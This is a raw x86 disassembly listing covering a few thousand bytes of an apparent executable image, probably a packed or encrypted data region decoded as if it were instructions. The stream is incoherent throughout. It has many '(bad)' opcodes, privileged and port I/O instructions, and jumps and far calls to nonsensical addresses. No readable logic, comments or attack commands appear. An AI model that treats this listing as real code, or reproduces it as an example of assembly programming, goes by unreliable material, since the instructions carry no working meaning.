  40b531:	stos   DWORD PTR es:[edi],eax
  40b532:	repz jle 0x40b515
  40b535:	cmc    
  40b536:	cmp    ah,BYTE PTR [ebp-0x2d]
  40b539:	mov    BYTE PTR [esi+0x4c9d6bef],dl
  40b53f:	jge    0x40b4d4
  40b541:	(bad)  
  40b542:	mov    BYTE PTR [ecx+0x52],ah
  40b545:	sbb    dh,ah
  40b547:	das    
  40b548:	ror    BYTE PTR [esi-0x73],0xe5
  40b54c:	and    eax,0x6457beb1
  40b551:	pusha  
  40b552:	adc    al,0xf8
  40b554:	int    0x87
  40b556:	je     0x40b520
  40b558:	xchg   esp,eax
  40b559:	out    dx,al
  40b55a:	out    dx,al
  40b55b:	xchg   esp,eax
  40b55c:	je     0x40b53b
  40b55e:	pop    ebp
  40b55f:	xchg   edx,eax
  40b560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b561:	sub    DWORD PTR [ebp-0x70],0x5c
  40b565:	adc    esp,DWORD PTR [edx+0x69a490ef]
  40b56b:	mov    eax,ds:0xe8dd24a9
  40b570:	jmp    0xc3e625ac
  40b575:	stos   BYTE PTR es:[edi],al
  40b576:	jns    0x40b528
  40b578:	sbb    al,0xe4
  40b57a:	push   0x8f93a7cb
  40b57f:	scas   eax,DWORD PTR es:[edi]
  40b580:	adc    BYTE PTR [eax],ah
  40b582:	jecxz  0x40b50a
  40b584:	push   ds
  40b585:	mov    al,ds:0x225d74be
  40b58a:	nop
  40b58b:	push   edi
  40b58c:	rcr    DWORD PTR [esi],cl
  40b58e:	addr16 push cs
  40b590:	es lahf 
  40b592:	adc    al,0xb1
  40b594:	mov    edi,0x7e99179d
  40b599:	int3   
  40b59a:	mov    ebx,0x9b1e0903
  40b59f:	sbb    al,0x69
  40b5a1:	loop   0x40b5bd
  40b5a3:	icebp  
  40b5a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a5:	jp     0x40b5b2
  40b5a7:	stos   BYTE PTR es:[edi],al
  40b5a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5a9:	adc    eax,DWORD PTR [edx-0x3f]
  40b5ac:	dec    edi
  40b5ad:	pop    ebx
  40b5ae:	mov    edi,0x60122bec
  40b5b3:	sbb    eax,0x560c5f45
  40b5b8:	test   BYTE PTR [ecx-0x1],cl
  40b5bb:	sbb    DWORD PTR [edi+0x7f2f82f3],eax
  40b5c1:	adc    ebx,DWORD PTR [ebp+0x76]
  40b5c4:	and    BYTE PTR [edx],bh
  40b5c6:	dec    eax
  40b5c7:	inc    ecx
  40b5c8:	inc    eax
  40b5c9:	xor    BYTE PTR [edi-0x1a],ah
  40b5cc:	or     al,0x90
  40b5ce:	mov    ch,ch
  40b5d0:	cmp    al,0x3
  40b5d2:	leave  
  40b5d3:	gs in  eax,dx
  40b5d5:	popf   
  40b5d6:	or     esp,DWORD PTR [ecx+ebp*4]
  40b5d9:	iret   
  40b5da:	jl     0x40b657
  40b5dc:	fstp   TBYTE PTR [ecx+0x79]
  40b5df:	pusha  
  40b5e0:	scas   al,BYTE PTR es:[edi]
  40b5e1:	inc    edi
  40b5e2:	inc    ebp
  40b5e3:	xor    bh,BYTE PTR [eax+0x3c3c421d]
  40b5e9:	(bad)  
  40b5ea:	shr    BYTE PTR [edi+0x1d56f09e],1
  40b5f0:	rcr    BYTE PTR [edx+ecx*4],0xd5
  40b5f4:	aaa    
  40b5f5:	jge    0x40b59a
  40b5f7:	rcl    BYTE PTR [edx],cl
  40b5f9:	add    eax,0x1f19d93b
  40b5fe:	jns    0x40b623
  40b600:	aas    
  40b601:	add    ecx,edi
  40b603:	push   ebx
  40b604:	test   eax,0x37d85ae3
  40b609:	mov    ecx,0x89fa0b56
  40b60e:	inc    esp
  40b60f:	jle    0x40b5a3
  40b611:	jmp    0xe3bb6633
  40b616:	out    dx,eax
  40b617:	add    edi,ecx
  40b619:	lea    esi,[esi-0x52]
  40b61c:	add    esi,eax
  40b61e:	mov    edi,0x24a8d6c
  40b623:	jmp    0x40b5d1
  40b625:	push   esp
  40b626:	jmp    0x40b69b
  40b628:	push   esi
  40b629:	aaa    
  40b62a:	lahf   
  40b62b:	dec    esp
  40b62c:	mov    eax,ds:0x474b5041
  40b631:	push   ecx
  40b632:	inc    ebp
  40b633:	es clc 
  40b635:	sub    DWORD PTR [ecx+0x75cad46a],0x62
  40b63c:	jp     0x40b634
  40b63e:	xchg   ecx,eax
  40b63f:	enter  0xf701,0xe7
  40b643:	xor    al,0xc3
  40b645:	cmp    eax,0x369bf65d
  40b64a:	pop    esp
  40b64b:	mov    ch,0x59
  40b64d:	or     cl,BYTE PTR [edx+0x3]
  40b650:	add    ebp,ebx
  40b652:	ds (bad) 
  40b655:	dec    eax
  40b656:	pop    ss
  40b657:	xchg   ebp,eax
  40b658:	fdivr  DWORD PTR [edi-0x52]
  40b65b:	mov    bl,0xeb
  40b65d:	jne    0x40b690
  40b65f:	mov    DWORD PTR [edi],0xd9739585
  40b665:	jmp    0x6412274c
  40b66a:	fbld   TBYTE PTR [ecx+0x67340a48]
  40b670:	imul   ebx,DWORD PTR [ebp+0x29a14828],0xffffff95
  40b677:	cwde   
  40b678:	xchg   edi,eax
  40b679:	test   BYTE PTR [esp+eax*1+0x1e11a39e],ch
  40b680:	cmp    ebp,DWORD PTR [esi+0x3e]
  40b683:	das    
  40b684:	leave  
  40b685:	(bad)  
  40b686:	mov    BYTE PTR [esi-0x37c95f87],ah
  40b68c:	mov    dl,0xdf
  40b68e:	mov    edi,DWORD PTR [eax+0x7]
  40b691:	cmp    bl,bh
  40b693:	scas   al,BYTE PTR es:[edi]
  40b694:	adc    ecx,edx
  40b696:	fadd   DWORD PTR [esi-0x56]
  40b699:	enter  0xb65c,0x4e
  40b69d:	sbb    al,0x81
  40b69f:	dec    edi
  40b6a0:	dec    edx
  40b6a1:	(bad)
  40b6a5:	shr    BYTE PTR [bp+di-0x5b9],0x1b
  40b6ab:	pop    ecx
  40b6ac:	dec    esi
  40b6ad:	cld    
  40b6ae:	jecxz  0x40b63b
  40b6b0:	lahf   
  40b6b1:	(bad)  
  40b6b3:	std    
  40b6b4:	dec    edx
  40b6b5:	cmc    
  40b6b6:	(bad)  
  40b6b7:	mov    eax,esp
  40b6b9:	xchg   edi,eax
  40b6ba:	mov    edx,0x792c2d9c
  40b6bf:	push   edx
  40b6c0:	xor    esp,DWORD PTR [ebp-0x7f69e73b]
  40b6c6:	mov    ds:0xd8fcd5a2,al
  40b6cb:	into   
  40b6cc:	cld    
  40b6cd:	int    0x3c
  40b6cf:	inc    esp
  40b6d0:	or     al,BYTE PTR [ebx]
  40b6d2:	or     BYTE PTR [ebx-0x4c],bh
  40b6d5:	popf   
  40b6d6:	loope  0x40b6d9
  40b6d8:	ss cs mov ah,0x7a
  40b6dc:	mov    ch,0xd9
  40b6de:	pop    es
  40b6df:	std    
  40b6e0:	adc    DWORD PTR [ebx-0x28],eax
  40b6e3:	sub    bh,BYTE PTR [edx+0x47251882]
  40b6e9:	or     DWORD PTR [edi+0x4b],esp
  40b6ec:	std    
  40b6ed:	hlt    
  40b6ee:	sub    edi,DWORD PTR [edx-0x7a]
  40b6f1:	pop    es
  40b6f2:	data16 add dh,BYTE PTR [ecx]
  40b6f5:	sbb    eax,DWORD PTR ds:0x7f325b9e
  40b6fb:	mov    al,ds:0xe1887e6a
  40b700:	aad    0x57
  40b702:	pop    esi
  40b703:	setge  BYTE PTR [ecx+0x1e]
  40b707:	out    dx,al
  40b708:	mov    al,0x5
  40b70a:	adc    cl,ch
  40b70c:	adc    eax,0x1a1e8b4a
  40b711:	pop    eax
  40b712:	lods   al,BYTE PTR ds:[esi]
  40b713:	aam    0x8f
  40b715:	mov    esp,ss
  40b717:	dec    ebx
  40b718:	pop    ecx
  40b719:	retf   0x3382
  40b71c:	jge    0x40b757
  40b71e:	sbb    DWORD PTR [ecx+0x2fcb8097],0x2e
  40b725:	add    al,0x55
  40b727:	dec    BYTE PTR [esi+0x61]
  40b72a:	fs out dx,eax
  40b72c:	pop    ecx
  40b72d:	shr    BYTE PTR [eax],0xd5
  40b730:	cwde   
  40b731:	leave  
  40b732:	push   di
  40b734:	mov    es:0xf90cbee9,al
  40b73a:	mov    edi,0x9dce4b34
  40b73f:	or     eax,0x35d7d9da
  40b744:	aas    
  40b745:	xchg   DWORD PTR [ebx],ecx
  40b747:	lds    ebx,FWORD PTR ds:0xf284948b
  40b74d:	pop    edx
  40b74e:	inc    ebx
  40b74f:	in     eax,0xf0
  40b751:	cs mov bl,0xa7
  40b754:	jmp    0x40b727
  40b756:	xor    al,al
  40b758:	repz fs jp 0x40b754
  40b75c:	fcomp  QWORD PTR [eax-0x6c424873]
  40b762:	cmp    eax,0x56b279d9
  40b767:	ss pop esi
  40b769:	outs   dx,BYTE PTR ds:[esi]
  40b76a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b76b:	int3   
  40b76c:	add    ebp,DWORD PTR [ebx]
  40b76e:	aas    
  40b76f:	popf   
  40b770:	or     eax,0xfbcd7535
  40b775:	pop    edi
  40b776:	mov    ds:0x8ed02786,al
  40b77b:	repz mov dl,0x19
  40b77e:	mov    dh,0x8d
  40b780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b781:	cmp    BYTE PTR [ecx+0xc],dl
  40b784:	bound  esi,QWORD PTR [edi]
  40b786:	jnp    0x40b800
  40b788:	popf   
  40b789:	fwait
  40b78a:	jl     0x40b70f
  40b78c:	jae    0x40b7be
  40b78e:	loopne 0x40b73f
  40b790:	push   0xffffff81
  40b792:	mov    DWORD PTR [ecx+0x52],ecx
  40b795:	mov    al,0x2b
  40b797:	adc    esi,esi
  40b799:	ds pop es
  40b79b:	paddusb mm5,QWORD PTR ds:0xc04096c0
  40b7a2:	xchg   ebp,eax
  40b7a3:	int3   
  40b7a4:	fisttp DWORD PTR [edi]
  40b7a6:	fst    DWORD PTR [eax]
  40b7a8:	lods   al,BYTE PTR ds:[esi]
  40b7a9:	in     al,0x22
  40b7ab:	aam    0xe4
  40b7ad:	ins    BYTE PTR es:[edi],dx
  40b7ae:	and    eax,0x8f5949c9
  40b7b3:	inc    esp
  40b7b4:	jo     0x40b789
  40b7b6:	jmp    0x40b775
  40b7b8:	sub    al,0xef
  40b7ba:	fiadd  DWORD PTR [eax-0x45ed1204]
  40b7c0:	rcr    BYTE PTR [edx],0x1b
  40b7c3:	dec    ebp
  40b7c4:	icebp  
  40b7c5:	stos   DWORD PTR es:[edi],eax
  40b7c6:	dec    esp
  40b7c7:	sti    
  40b7c8:	aam    0x92
  40b7ca:	into   
  40b7cb:	adc    eax,0xbf8e3ed3
  40b7d0:	test   BYTE PTR [esi-0x4aa9b0b8],dh
  40b7d6:	sbb    eax,0x31edb720
  40b7db:	mov    bh,0xe2
  40b7dd:	and    al,BYTE PTR es:[ebp-0x4a3f20a4]
  40b7e4:	rcl    BYTE PTR [ecx],0x5d
  40b7e7:	retf   0x8997
  40b7ea:	in     eax,dx
  40b7eb:	int    0xdb
  40b7ed:	cs jae 0x40b7e3
  40b7f0:	add    ah,BYTE PTR [esi+0x37]
  40b7f3:	shl    DWORD PTR [ecx-0x1d],1
  40b7f6:	icebp  
  40b7f7:	push   esi
  40b7f8:	adc    BYTE PTR [edx-0x32935547],0xc1
  40b7ff:	and    eax,0xf7992299
  40b804:	arpl   WORD PTR [edi-0x2e5bbbc5],cx
  40b80a:	jnp    0x40b7e0
  40b80c:	test   eax,0x699061fa
  40b811:	adc    al,BYTE PTR [ebx+0x4a8c6bdd]
  40b817:	push   esp
  40b818:	cmp    eax,0xecab67d5
  40b81d:	add    DWORD PTR ss:[edx+0x42],0x2
  40b822:	xchg   ecx,eax
  40b823:	mov    edx,eax
  40b825:	vshufpd ymm2,ymm2,ymm6,0x16
  40b82a:	hlt    
  40b82b:	pop    edi
  40b82c:	cmp    eax,0x2d487bc0
  40b831:	loop   0x40b884
  40b833:	fwait
  40b834:	pop    edi
  40b835:	ins    DWORD PTR es:[edi],dx
  40b836:	or     ecx,esp
  40b838:	sbb    dh,bl
  40b83a:	lea    eax,[esi-0x29]
  40b83d:	in     al,dx
  40b83e:	outs   dx,BYTE PTR ds:[esi]
  40b83f:	outs   dx,BYTE PTR ds:[esi]
  40b840:	(bad)
  40b844:	mov    gs,WORD PTR [ebx+ebp*1]
  40b847:	xchg   ebx,eax
  40b848:	sbb    BYTE PTR [eax+edi*1+0x3d8b946],bl
  40b84f:	push   ecx
  40b850:	call   0x6cfd:0xc1ccccd5
  40b857:	scas   al,BYTE PTR es:[edi]
  40b858:	ffree  st(5)
  40b85a:	je     0x40b890
  40b85c:	gs je  0x40b880
  40b85f:	sub    edx,DWORD PTR [edx]
  40b861:	retf   0xb313
  40b864:	mov    ebx,0x3a534135
  40b869:	imul   ebp,DWORD PTR [esi+0x3fb2f64a],0x6d
  40b870:	pop    ebx
  40b871:	mov    DWORD PTR [esi+0x1c],esp
  40b874:	mov    ch,0x70
  40b876:	inc    edi
  40b877:	fimul  WORD PTR [edx+0x4c]
  40b87a:	or     bl,ah
  40b87c:	sbb    esp,edi
  40b87e:	into   
  40b87f:	shr    DWORD PTR ds:0xecb5adf6,cl
  40b885:	inc    edi
  40b886:	add    eax,0x890eb413
  40b88b:	sub    edx,DWORD PTR ds:0x51aac5b7
  40b891:	retf   0xf73a
  40b894:	ror    BYTE PTR [esi],0xa6
  40b897:	(bad)  
  40b898:	mov    ebx,0x6fde7ec3
  40b89d:	or     bh,BYTE PTR [edi]
  40b89f:	iret   
  40b8a0:	clc    
  40b8a1:	stos   DWORD PTR es:[edi],eax
  40b8a2:	popf   
  40b8a3:	mov    edi,0x49c7c3c
  40b8a8:	mov    dh,0x9f
  40b8aa:	cmp    eax,0xf89234c5
  40b8af:	cmc    
  40b8b0:	stos   BYTE PTR es:[edi],al
  40b8b1:	xchg   DWORD PTR [ebx+0x15],ecx
  40b8b4:	pop    eax
  40b8b5:	sub    al,0xb8
  40b8b7:	mov    cl,0x22
  40b8b9:	fimul  DWORD PTR [esp+ebp*2-0x56fce8c7]
  40b8c0:	enter  0x4c6a,0x93
  40b8c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8c5:	xchg   DWORD PTR [ecx+0x42],ecx
  40b8c8:	mov    al,0xc2
  40b8ca:	(bad)  
  40b8cb:	sahf   
  40b8cc:	push   edx
  40b8cd:	repz sub DWORD PTR [edi+0x31],esi
  40b8d1:	jmp    0x7edc:0x640a2c65
  40b8d8:	mov    cl,0x93
  40b8da:	dec    edi
  40b8db:	aam    0x47
  40b8dd:	mov    esp,0x901a84e4
  40b8e2:	mov    al,ds:0x15102d78
  40b8e7:	or     edx,DWORD PTR [eax+0x6]
  40b8ea:	or     esp,DWORD PTR [ecx-0x79ada3e1]
  40b8f0:	mov    DWORD PTR [edi+0x67],esp
  40b8f3:	(bad)  
  40b8f5:	mov    eax,0x99a13aa2
  40b8fa:	mov    DWORD PTR [ecx+0x622b9663],edx
  40b900:	in     al,dx
  40b901:	rcr    DWORD PTR [ecx-0x3444001d],cl
  40b907:	aaa    
  40b908:	adc    al,0x3d
  40b90a:	inc    edx
  40b90b:	fs xchg edx,eax
  40b90d:	mov    al,ds:0x8731c36
  40b912:	sbb    DWORD PTR [edx-0x67a08e8e],ebx
  40b918:	xchg   DWORD PTR [ecx+0x69110f33],eax
  40b91e:	popa   
  40b91f:	addr16 cwde 
  40b921:	lock push eax
  40b923:	out    dx,eax
  40b924:	cdq    
  40b925:	mov    bl,0xd1
  40b927:	mov    al,ds:0x3e0099a6
  40b92c:	or     edi,edi
  40b92e:	repnz adc cl,0x5e
  40b932:	aam    0xd4
  40b934:	cld    
  40b935:	stos   BYTE PTR es:[edi],al
  40b936:	jge    0x40b957
  40b938:	(bad)  
  40b939:	xchg   ebx,eax
  40b93a:	push   ecx
  40b93b:	das    
  40b93c:	add    eax,0x3b70f355
  40b941:	or     BYTE PTR [edi-0x5c6cae67],ch
  40b947:	xchg   edx,eax
  40b948:	dec    eax
  40b949:	int3   
  40b94a:	xchg   DWORD PTR [edx],esi
  40b94c:	xor    DWORD PTR [esi],esp
  40b94e:	popa   
  40b94f:	repz sub eax,0x658d3322
  40b955:	stos   BYTE PTR es:[edi],al
  40b956:	js     0x40b91d
  40b958:	cmp    DWORD PTR [edi+0xf],ecx
  40b95b:	jae    0x40b8ef
  40b95d:	pop    ds
  40b95e:	aad    0x30
  40b960:	gs cmp eax,0xae95eb70
  40b966:	in     eax,0xd7
  40b968:	mov    al,BYTE PTR [esi+esi*8]
  40b96b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b96c:	fadd   QWORD PTR [ebx+esi*2+0x47]
  40b970:	jnp    0x40b927
  40b972:	xor    ebp,DWORD PTR [esi+0x4866d749]
  40b978:	shl    DWORD PTR [esi-0x49],cl
  40b97b:	dec    esi
  40b97c:	sbb    DWORD PTR [ecx+0x5955bd7],esp
  40b982:	rol    BYTE PTR [esi],1
  40b984:	push   0xda66ba2c
  40b989:	out    0x31,eax
  40b98b:	add    al,0xbe
  40b98d:	push   ebp
  40b98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b98f:	lock mov ch,0xd4
  40b992:	int    0x91
  40b994:	mov    bh,0xf3
  40b996:	in     eax,0x8c
  40b998:	sar    BYTE PTR [eax+0x5d090b5],1
  40b99e:	(bad)  
  40b99f:	push   ebx
  40b9a0:	popf   
  40b9a1:	ja     0x40ba12
  40b9a3:	adc    DWORD PTR [edi],esp
  40b9a5:	or     al,0xa3
  40b9a7:	jne    0x40b97d
  40b9a9:	push   edx
  40b9aa:	sub    BYTE PTR [ebx-0x35f2d22e],ch
  40b9b0:	fidivr WORD PTR [ecx+0x73453ad4]
  40b9b6:	cmp    al,0x85
  40b9b8:	jbe    0x40b9c3
  40b9ba:	ins    DWORD PTR es:[edi],dx
  40b9bb:	lods   eax,DWORD PTR ds:[esi]
  40b9bc:	retf   
  40b9bd:	xchg   DWORD PTR [ecx+0x32],edi
  40b9c0:	fiadd  DWORD PTR [eax-0x82701d7]
  40b9c6:	imul   edi,DWORD PTR [edi-0x482bf266],0xffffffa4
  40b9cd:	jb     0x40b95b
  40b9cf:	(bad)  
  40b9d1:	sbb    BYTE PTR [eax],dh
  40b9d3:	sub    ch,0x9a
  40b9d6:	outs   dx,DWORD PTR ds:[esi]
  40b9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9d8:	adc    eax,0x3857605c
  40b9dd:	stc    
  40b9de:	dec    esp
  40b9df:	into   
  40b9e0:	mov    edx,0x40650c41
  40b9e5:	sti    
  40b9e6:	into   
  40b9e7:	sub    esi,DWORD PTR [edx]
  40b9e9:	xchg   ecx,eax
  40b9ea:	cmp    cl,BYTE PTR [edi+0x7dae9e7c]
  40b9f0:	cmp    ebp,DWORD PTR [edx]
  40b9f2:	shl    BYTE PTR [edx-0x27],0x88
  40b9f6:	mov    ch,0x13
  40b9f8:	test   BYTE PTR [edx],cl
  40b9fa:	xchg   ebx,eax
  40b9fb:	stos   BYTE PTR es:[edi],al
  40b9fc:	icebp  
  40b9fd:	mov    edi,0x65e406e6
  40ba02:	iret   
  40ba03:	xlat   BYTE PTR ds:[ebx]
  40ba04:	in     eax,dx
  40ba05:	call   0x142db83b
  40ba0a:	es and al,0x85
  40ba0d:	into   
  40ba0e:	addr16 push esi
  40ba10:	pop    ecx
  40ba11:	adc    al,0x57
  40ba13:	jmp    0xda00c128
  40ba18:	(bad)  
  40ba19:	xchg   ecx,eax
  40ba1a:	ret    0x4efd
  40ba1d:	cdq    
  40ba1e:	loope  0x40b9c5
  40ba20:	test   DWORD PTR [ecx],edx
  40ba22:	jnp    0x40ba14
  40ba24:	ficom  DWORD PTR [esi+0x559024cb]
  40ba2a:	out    0x1f,eax
  40ba2c:	call   0xbae1:0x57f79134
  40ba33:	and    edi,ebp
  40ba35:	call   0xbb9d:0x903c737f
  40ba3c:	sbb    DWORD PTR [esi-0x75d8c066],0xffffffb3
  40ba43:	rcl    DWORD PTR [edx+0x79841c1d],cl
  40ba49:	adc    esp,edi
  40ba4b:	push   ebx
  40ba4c:	pusha  
  40ba4d:	lock neg DWORD PTR [ebx]
  40ba50:	jns    0x40ba2c
  40ba52:	loopne 0x40ba66
  40ba54:	xor    BYTE PTR [edx],bl
  40ba56:	lds    edx,FWORD PTR [esi]
  40ba58:	fadd   QWORD PTR [eax+0x59b77140]
  40ba5e:	xchg   ecx,eax
  40ba5f:	shl    DWORD PTR [eax-0x886dee5],cl
  40ba65:	repnz mov esp,0x69f9812d
  40ba6b:	pusha  
  40ba6c:	add    eax,0x5234a2f7
  40ba71:	cdq    
  40ba72:	mov    ?,WORD PTR [eax]
  40ba74:	sar    BYTE PTR [edi+edi*2],0x4b
  40ba78:	inc    edx
  40ba79:	sub    BYTE PTR [ebx+esi*8-0x12],ah
  40ba7d:	test   DWORD PTR [ebx-0x4dd1db8a],eax
  40ba83:	stos   BYTE PTR es:[edi],al
  40ba84:	add    al,0xbc
  40ba86:	mov    edx,0x95d8dce8
  40ba8b:	lahf   
  40ba8c:	inc    ecx
  40ba8d:	or     al,BYTE PTR [ecx+0x13]
  40ba90:	sub    bh,bh
  40ba92:	stos   BYTE PTR es:[edi],al
  40ba93:	mov    cl,0xa3
  40ba95:	inc    ecx
  40ba96:	lds    esp,FWORD PTR [edx-0x5ca7cf8e]
  40ba9c:	cmp    DWORD PTR [ecx+0x29],0xffffffcb
  40baa0:	dec    ebp
  40baa1:	jl     0x40baf0
  40baa3:	jecxz  0x40ba52
  40baa5:	lahf   
  40baa6:	mov    ds:0x5096f8a9,al
  40baab:	addr16 cwde 
  40baad:	mov    eax,ds:0xddf21474
  40bab2:	pop    ebx
  40bab3:	into   
  40bab4:	stc    
  40bab5:	adc    al,BYTE PTR [ecx]
  40bab7:	add    edx,DWORD PTR [ebp-0x79]
  40baba:	fcmovbe st,st(7)
  40babc:	and    al,0x8f
  40babe:	sub    esp,edi
  40bac0:	mov    eax,0x90da00f
  40bac5:	jnp    0x40bacf
  40bac7:	data16 into 
  40bac9:	push   0x55
  40bacb:	jge    0x40baf8
  40bacd:	mov    al,0xd3
  40bacf:	xor    eax,0x63731436
  40bad4:	scas   al,BYTE PTR es:[edi]
  40bad5:	adc    al,0xc0
  40bad7:	xchg   esi,eax
  40bad8:	xchg   edx,eax
  40bad9:	inc    DWORD PTR [ebx+esi*8-0xf]
  40badd:	repnz mov eax,0xa8908f04
  40bae3:	jmp    0xd454:0xacbbdfae
  40baea:	(bad)  
  40baeb:	sbb    BYTE PTR ds:0xd997b96e,cl
  40baf1:	mov    bl,0x98
  40baf3:	inc    ebp
  40baf4:	cmp    eax,0x5fb2729f
  40baf9:	aad    0xd3
  40bafb:	out    0x17,al
  40bafd:	hlt    
  40bafe:	dec    ecx
  40baff:	mov    dl,0xc0
  40bb01:	mov    bh,0xb2
  40bb03:	iret   
  40bb04:	outs   dx,DWORD PTR ds:[esi]
  40bb05:	fistp  WORD PTR [edx]
  40bb07:	push   cs
  40bb08:	call   DWORD PTR [ebx+0x43]
  40bb0b:	jo     0x40bae2
  40bb0d:	or     DWORD PTR [ecx+0x68b4e22],ebp
  40bb13:	fwait
  40bb14:	cld    
  40bb15:	ja     0x40bac2
  40bb17:	mov    gs,WORD PTR [esi]
  40bb19:	cs push cs
  40bb1b:	mov    ds:0x90032a21,eax
  40bb20:	pop    ebx
  40bb21:	int    0xb3
  40bb23:	add    dl,bl
  40bb25:	repz retf 
  40bb27:	cmp    DWORD PTR [ebp+edi*8-0x66b3da94],0x3279aa2d
  40bb32:	mov    ebx,0x7dbfa2c5
  40bb37:	sbb    al,0xb5
  40bb39:	loope  0x40bb76
  40bb3b:	fimul  DWORD PTR ds:0x65007dc8
  40bb41:	mov    edx,DWORD PTR [edi+ebx*8]
  40bb44:	or     BYTE PTR [ebp+0x6a],0x3e
  40bb48:	push   esp
  40bb49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb4a:	mov    esp,0x4848f298
  40bb4f:	stc    
  40bb50:	inc    ebp
  40bb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb52:	dec    ebp
  40bb53:	mov    dh,0x6
  40bb55:	je     0x40bafd
  40bb57:	jno    0x40bb5c
  40bb59:	or     bh,bl
  40bb5b:	sbb    eax,0x1e9a3636
  40bb60:	fdiv   QWORD PTR [ecx-0x477285a5]
  40bb66:	shr    DWORD PTR [esi-0x4e],cl
  40bb69:	mov    eax,0xa2deb4d1
  40bb6e:	je     0x40bb18
  40bb70:	jl     0x40bb16
  40bb72:	pop    esp
  40bb73:	aas    
  40bb74:	push   es
  40bb75:	dec    edx
  40bb76:	cmp    eax,0xf33d4817
  40bb7b:	int3   
  40bb7c:	xchg   esp,eax
  40bb7d:	(bad)  
  40bb7e:	pop    eax
  40bb7f:	xchg   ecx,eax
  40bb80:	fcmovbe st,st(7)
  40bb82:	inc    edi
  40bb83:	jno    0x40bb8d
  40bb85:	scas   al,BYTE PTR es:[edi]
  40bb86:	mov    DWORD PTR [ebx],esp
  40bb88:	adc    DWORD PTR [esp+eax*8+0x6702350f],esi
  40bb8f:	or     esi,ecx
  40bb91:	pop    eax
  40bb92:	fidivr DWORD PTR [esi]
  40bb94:	leave  
  40bb95:	xor    DWORD PTR [eax+0x7f1da32e],0x1d83a92
  40bb9f:	jne    0x40bb71
  40bba1:	pushf  
  40bba2:	pusha  
  40bba3:	pop    esp
  40bba4:	xchg   ebx,eax
  40bba5:	test   al,0xfa
  40bba7:	xchg   esi,eax
  40bba8:	mov    ecx,0xa1c05a4e
  40bbad:	and    BYTE PTR [ebp-0x46421fa2],al
  40bbb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbb4:	cli    
  40bbb5:	inc    esp
  40bbb6:	dec    esp
  40bbb7:	jnp    0x40bb4b
  40bbb9:	lea    ebx,[eax]
  40bbbb:	pop    ebx
  40bbbc:	dec    esi
  40bbbd:	sti    
  40bbbe:	(bad)  
  40bbbf:	test   eax,0x2a18c62b
  40bbc4:	bnd jg 0x40bbbc
  40bbc7:	mov    bh,0xb7
  40bbc9:	or     al,0x2b
  40bbcb:	out    dx,eax
  40bbcc:	aad    0x39
  40bbce:	adc    DWORD PTR fs:[esi-0x62e2a434],esi
  40bbd5:	xchg   esp,eax
  40bbd6:	dec    esi
  40bbd7:	dec    ecx
  40bbd8:	hlt    
  40bbd9:	loope  0x40bbac
  40bbdb:	and    al,bl
  40bbdd:	xor    dl,BYTE PTR [ebp-0x5baaa9a6]
  40bbe3:	inc    esi
  40bbe4:	inc    ecx
  40bbe5:	enter  0x85d0,0xfb
  40bbe9:	sbb    eax,0xd8295164
  40bbee:	shl    DWORD PTR [ebx-0x6e6e1b67],1
  40bbf4:	jp     0x40bbdd
  40bbf6:	mov    ds,WORD PTR [eax]
  40bbf8:	sbb    eax,0xb6e1a1d6
  40bbfd:	sahf   
  40bbfe:	aas    
  40bbff:	rep ins DWORD PTR es:[edi],dx
  40bc01:	test   al,0xa2
  40bc03:	imul   eax,DWORD PTR [ebx-0x7b3cdb63],0xffffff91
  40bc0a:	or     bl,bl
  40bc0c:	and    DWORD PTR [eax+0x1d],ebx
  40bc0f:	jge    0x40bbcd
  40bc11:	addr16 mov ebx,ss
  40bc14:	sub    al,0xaa
  40bc16:	sub    edx,edi
  40bc18:	adc    dl,cl
  40bc1a:	jge    0x40bb9d
  40bc1c:	aaa    
  40bc1d:	xor    cl,bl
  40bc1f:	mov    esp,0xb28737da
  40bc24:	jbe    0x40bc95
  40bc26:	add    ebp,edx
  40bc28:	and    DWORD PTR [esi-0x346927e2],ebp
  40bc2e:	or     BYTE PTR [esi],0x3f
  40bc31:	ja     0x40bbc9
  40bc33:	es mov al,0xba
  40bc36:	les    eax,FWORD PTR [eax]
  40bc38:	jecxz  0x40bc59
  40bc3a:	fcom   QWORD PTR fs:[eax+eax*1-0x49cbd298]
  40bc42:	dec    esp
  40bc43:	(bad)  
  40bc44:	shl    ecx,0x2d
  40bc47:	ret    
  40bc48:	and    eax,0x7e1e143d
  40bc4d:	imul   edx,DWORD PTR [ebp+0x67],0x32b6520a
  40bc54:	adc    DWORD PTR [eax+0x47],0x996fa276
  40bc5b:	jbe    0x40bc89
  40bc5d:	xor    edx,DWORD PTR [edi-0x48c4a06a]
  40bc63:	scas   eax,DWORD PTR es:[edi]
  40bc64:	dec    esi
  40bc65:	pop    ss
  40bc66:	imul   BYTE PTR [ebp+0x5c707e50]
  40bc6c:	lea    esp,[eax+ebx*8-0x37]
  40bc70:	inc    ecx
  40bc71:	(bad)  
  40bc72:	(bad)  
  40bc73:	imul   edx,DWORD PTR [ebp-0x3372241],0x360fdb8d
  40bc7d:	cmp    DWORD PTR [ebp-0x18ab73af],ecx
  40bc83:	jns    0x40bc22
  40bc85:	data16 mov dh,0x6c
  40bc88:	sub    ebp,DWORD PTR [edi]
  40bc8a:	stos   DWORD PTR es:[edi],eax
  40bc8b:	lods   eax,DWORD PTR ds:[esi]
  40bc8c:	fnstcw WORD PTR [edi+0x1519752]
  40bc92:	cmp    bh,BYTE PTR [edi]
  40bc94:	cwde   
  40bc95:	mov    eax,0xa18dcf63
  40bc9a:	jmp    0x40bc3d
  40bc9c:	out    dx,eax
  40bc9d:	mov    BYTE PTR [ebp-0x49],ch
  40bca0:	das    
  40bca1:	and    bl,BYTE PTR [esi+0x44c1c11f]
  40bca7:	xchg   edx,eax
  40bca8:	imul   esi,DWORD PTR [esi-0x5a66c6f5],0xecbb7ca8
  40bcb2:	mov    dl,0x75
